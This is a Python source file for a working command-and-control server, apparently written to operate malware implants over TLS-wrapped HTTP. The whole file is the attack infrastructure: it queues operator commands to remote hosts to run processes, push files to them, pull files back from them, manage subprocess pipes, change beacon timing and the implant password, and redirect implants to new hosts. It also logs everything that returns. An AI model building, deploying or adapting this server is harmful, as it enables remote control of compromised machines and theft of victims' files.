import os
import ssl
import threading
import queue
from http.server import BaseHTTPRequestHandler, HTTPServer

SECURITY_PASSWORD_FILE = "security_password.txt"
HOST_CONFIG_FILE = "host_config.txt"

def load_security_password():
    if os.path.exists(SECURITY_PASSWORD_FILE):
        with open(SECURITY_PASSWORD_FILE, "r", encoding="utf-8") as f:
            return f.read().strip()
    pw = "test"
    with open(SECURITY_PASSWORD_FILE, "w", encoding="utf-8") as f:
        f.write(pw)
    return pw

def store_security_password(new_password):
    with open(SECURITY_PASSWORD_FILE, "w", encoding="utf-8") as f:
        f.write(new_password)

def load_host_config():
    if os.path.exists(HOST_CONFIG_FILE):
        with open(HOST_CONFIG_FILE, "r", encoding="utf-8") as f:
            return f.read().strip()
    return ""

def store_host_config(ip_port_str):
    with open(HOST_CONFIG_FILE, "w", encoding="utf-8") as f:
        f.write(ip_port_str)

SECURITY_PASSWORD = load_security_password()
command_queue = queue.Queue()
connected_guids = {}
fileFrom = {}
pending_passwords = {}
pending_hosts = {}
last_command = {}

COMMANDS = {
    0x00: "Authentication", 0x01: "Execute process", 0x02: "Execute w/ output", 0x03: "Download file",
    0x04: "Upload file",    0x05: "Create Subprocess",0x06: "Close Subprocess",0x07: "Subprocess pipe in/out",
    0x08: "Set TimeLong",   0x09: "Set TimeShort",    0x0A: "Set new Security password", 0x0B: "Set Host(s)"
}

def log_to_file(message, filename="c2_server.log"):
    with open(filename, "a", encoding="utf-8") as lf:
        lf.write(f"{message}\n")

def decode_file_command(payload: bytes):
    path_bytes = bytearray()
    i = 0
    while i + 1 < len(payload):
        if payload[i] == 0x00 and payload[i+1] == 0x00:
            i += 2
            break
        path_bytes.extend(payload[i:i+2])
        i += 2
    return path_bytes.decode("utf-16-le", errors="ignore"), payload[i:]

def decode_body(response_body):
    try:
        cmd = response_body[0]
        cmd_desc = COMMANDS.get(cmd, "Unknown Command")
        payload = response_body[1:]
        if cmd in [0x03, 0x04]:
            client_path, file_data = decode_file_command(payload)
            return {
                "Command": cmd_desc,
                "Client Path": client_path,
                "Binary Data Length": len(file_data),
                "Binary Data Preview": file_data[:20],
            }
        return {"Command": cmd_desc, "Decoded String": payload.decode("utf-16-le", errors="ignore").rstrip("\x00")}
    except Exception as e:
        return {"Error": str(e)}

class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        log_to_file(f"{self.address_string()} - - [{self.log_date_time_string()}] {format % args}")

    def send_ok(self):
        self.send_response(200)
        self.end_headers()

    def send_get_response(self, body):
        cmd_len = len(body)
        self.send_response(200)
        self.send_header("Title", cmd_len)
        self.end_headers()
        log_to_file(f"GET -> Title: {cmd_len}")
        log_to_file(f"GET -> Body raw: {body}")
        log_to_file(f"GET -> Body: {decode_body(body)}")
        self.wfile.write(body)

    def do_GET(self):
        guid = self.headers.get("Title") or "UnknownGUID"
        if guid not in connected_guids:
            connected_guids[guid] = False
        if command_queue.empty():
            self.send_ok()
            return
        if not connected_guids[guid]:
            auth_cmd = 0x00
            payload = SECURITY_PASSWORD.encode("utf-16-le") + b"\x00\x00"
            self.send_get_response(bytes([auth_cmd]) + payload)
            return
        item = command_queue.get()
        command_byte = item[0]
        args = item[1:]
        last_command[guid] = item
        response_body = b""

        if command_byte == 0x03:  # Download file
            file_path, client_path = args
            try:
                with open(file_path, "rb") as f:
                    file_data = f.read()
                path_utf16 = client_path.encode("utf-16-le") + b"\x00\x00"
                response_body = bytes([command_byte]) + path_utf16 + file_data
                log_to_file(f"Queued Download: {file_path} -> {client_path}")
            except Exception as e:
                log_to_file(f"Download file error: {e}")
        elif command_byte == 0x04:  # Upload file
            file_path, client_path = args
            fileFrom[guid] = file_path
            path_utf16 = client_path.encode("utf-16-le") + b"\x00\x00"
            response_body = bytes([command_byte]) + path_utf16
        elif command_byte == 0x0A:  # Set new Security password
            new_password = " ".join(args)
            pending_passwords[guid] = new_password
            payload_utf16 = new_password.encode("utf-16-le") + b"\x00\x00"
            response_body = bytes([command_byte]) + payload_utf16
            log_to_file(f"Set new Security password queued for {guid}: {new_password}")
        elif command_byte == 0x0B:  # Set host config
            ip, port = args
            pending_hosts[guid] = f"{ip} {port}"
            payload_utf16 = (f"{ip} {port}").encode("utf-16-le") + b"\x00\x00"
            response_body = bytes([command_byte]) + payload_utf16
            log_to_file(f"Set Host(s) queued for {guid}: {ip} {port}")
        else:  # Other commands
            combined_args = " ".join(args)
            payload_utf16 = combined_args.encode("utf-16-le") + b"\x00\x00"
            response_body = bytes([command_byte]) + payload_utf16

        self.send_get_response(response_body)

    def do_POST(self):
        guid = self.headers.get("Title", "NoGuid")
        if guid not in connected_guids:
            connected_guids[guid] = False
        content_length = int(self.headers.get('Content-Length', 0))
        raw_data = self.rfile.read(content_length)
        if not raw_data:
            self.send_ok()
            return
        cmd = raw_data[0]
        error_code = raw_data[1] if len(raw_data) > 1 else None

        if error_code == 0x02:
            log_to_file(f"POST -> 0x02 error from {guid}. Re-send the last command.")
            if guid in last_command:
                command_queue.put(last_command[guid])
                connected_guids[guid] = False
                log_to_file(f"Re-queued last command: {last_command[guid]}")
            else:
                log_to_file(f"No last command stored for {guid}.")
        elif cmd == 0x00:
            if len(raw_data) > 1 and raw_data[1] == 0x00:
                connected_guids[guid] = True
                log_to_file(f"POST -> {guid} is now authenticated.")
            else:
                connected_guids[guid] = False
                log_to_file(f"POST -> Auth error from {guid}. raw_data={raw_data}")
        elif cmd == 0x02:
            print(f"POST -> {COMMANDS.get(cmd, 'Unknown')} from {guid}. raw_data={raw_data}")
            log_to_file(f"POST -> {COMMANDS.get(cmd, 'Unknown')} from {guid}. raw_data={raw_data}")
        elif cmd == 0x04:
            if fileFrom.get(guid) != "DONE":
                filename = fileFrom.get(guid)
                if filename:
                    with open(filename, "wb") as f:
                        f.write(raw_data[2:])
                    log_to_file(f"POST -> Received file chunk from {guid} into {filename}")
                    fileFrom[guid] = "DONE"
                else:
                    log_to_file(f"POST -> No filename for {guid}. raw={raw_data}")
            else:
                log_to_file(f"POST -> Already saved file from {guid}: {raw_data}")
        elif cmd == 0x0A:
            if len(raw_data) > 1 and raw_data[1] == 0x00:
                new_pass = pending_passwords.get(guid)
                if new_pass:
                    store_security_password(new_pass)
                    log_to_file(f"POST -> Password changed for {guid}. Now '{new_pass}' stored.")
                    del pending_passwords[guid]
                else:
                    log_to_file(f"POST -> 0x0A ack from {guid}, but no pending password found.")
            else:
                log_to_file(f"POST -> 0x0A from {guid}, second byte != 0x00. Raw={raw_data}")
        elif cmd == 0x0B:
            if len(raw_data) > 1 and raw_data[1] == 0x00:
                new_host = pending_hosts.get(guid)
                if new_host:
                    store_host_config(new_host)
                    log_to_file(f"POST -> Host config changed for {guid}. Now '{new_host}' stored.")
                    del pending_hosts[guid]
                else:
                    log_to_file(f"POST -> 0x0B ack from {guid}, but no pending host found.")
            else:
                log_to_file(f"POST -> 0x0B from {guid}, second byte != 0x00. Raw={raw_data}")
        else:
            log_to_file(f"POST -> {COMMANDS.get(cmd, 'Unknown')} from {guid}. raw_data={raw_data}")

        self.send_ok()

def read_commands():
    while True:
        user_input = input("Enter command (e.g. 'b 192.168.56.1 9500'): ").strip()
        if user_input:
            parts = user_input.split()
            try:
                if parts[0].lower() == 'b':
                    cmd = 0x0B
                    args = parts[1:]
                else:
                    cmd = int(parts[0], 16)
                    args = parts[1:]
            except ValueError:
                print("Invalid format. e.g. 'b 192.168.56.1 9500' or '9 2000'")
                continue
            command_queue.put([cmd] + args)
            log_to_file(f"Command added: {COMMANDS.get(cmd, 'Unknown')} {args}")

def start_c2_server(server_started_event):
    host_config = load_host_config()
    if host_config:
        ip_str, port_str = host_config.split()
        server_ip, server_port = ip_str, int(port_str)
    else:
        server_ip, server_port = '0.0.0.0', 9500
    httpd = HTTPServer((server_ip, server_port), C2Handler)
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile="server.crt", keyfile="server.key")
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
    print(f"Server started {server_ip}:{server_port}")
    server_started_event.set()  # Notify that the server has started
    httpd.serve_forever()

if __name__ == "__main__":
    server_started_event = threading.Event()
    threading.Thread(target=start_c2_server, args=(server_started_event,), daemon=True).start()

    # Wait for the server to start before reading commands
    server_started_event.wait()
    print("C2 server is running. Ready to accept commands.")
    read_commands()

